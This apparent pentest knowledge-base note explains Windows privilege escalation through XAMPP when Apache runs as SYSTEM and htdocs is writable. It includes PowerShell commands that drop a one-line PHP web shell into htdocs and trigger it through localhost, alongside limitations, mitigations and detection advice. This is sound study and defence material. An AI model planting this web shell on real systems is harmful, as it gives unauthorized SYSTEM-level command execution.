---
topic: XAMPP privilege escalation
tags: [windows, xampp, apache, webshell, htdocs, system]
---

# XAMPP privilege escalation

**English** | [🇪🇸 Español](xampp-privesc.md)

## Concept

XAMPP installs Apache and PHP for development, often with a writable `htdocs` and the service running as `NT AUTHORITY\SYSTEM`. If a user can write to `C:\xampp\htdocs`, they can drop a PHP file and request `http://localhost` to execute commands with the service's privileges.

## When it applies

- XAMPP installed on the host.
- Apache running as SYSTEM.
- `htdocs` writable by users.
- PHP enabled and reachable locally.

## Procedure

1. Locate the installation and `htdocs`.
2. Review permissions with `icacls`.
3. Check the Apache service identity.
4. Write a PHP file with `system`.
5. Request it through `localhost` and check the identity.

```powershell
icacls C:\xampp\htdocs
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select Name,StartName
'<?php system($_GET["c"]); ?>' | Set-Content C:\xampp\htdocs\sh.php
curl.exe -k "https://localhost/sh.php?c=whoami"
```

## Variants

- `htdocs` writable by `BUILTIN\Users`.
- Apache as SYSTEM or a privileged service account.
- PHP with an empty `disable_functions`.
- An additional virtual host or alias.

## Limitations

- The service must be running.
- The firewall may block the port.
- `htdocs` may not be writable.
- PHP may be disabled or restricted.

## Mitigation and detection

- Do not run Apache as SYSTEM.
- Restrict `htdocs` permissions.
- Disable dangerous functions and remove XAMPP from production.
- Alert on new PHP files and requests to `localhost`.

## References

- <https://www.apachefriends.org/docs/>
- <https://attack.mitre.org/techniques/T1505/003/>
- <https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload>
